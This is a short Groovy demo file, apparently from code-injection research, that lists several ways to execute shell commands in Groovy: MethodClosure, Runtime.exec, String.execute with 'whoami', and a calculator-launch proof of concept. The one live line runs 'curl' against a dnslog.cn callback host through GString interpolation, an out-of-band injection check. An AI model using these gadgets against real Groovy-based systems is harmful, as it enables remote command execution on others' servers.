package com.t4rrega.injection.Code.Groovy

class GroovyDemo1 {
    static void main(String[] args) {
        String cmd = "open -a Calculator.app"

        // 1. MethodClosure
//        MethodClosure methodClosure = new MethodClosure(cmd,"execute");
//        methodClosure.call();

        // 2. Runtime
//        Runtime.getRuntime().exec(cmd);

        // 3. 支持回显
//        println("whoami".execute().text)

        // 4. 直接执行命令
//        "open -a calculator.app".execute()

        // 5. $
        "${"curl http://xsw60n.dnslog.cn".execute().text}"
    }
}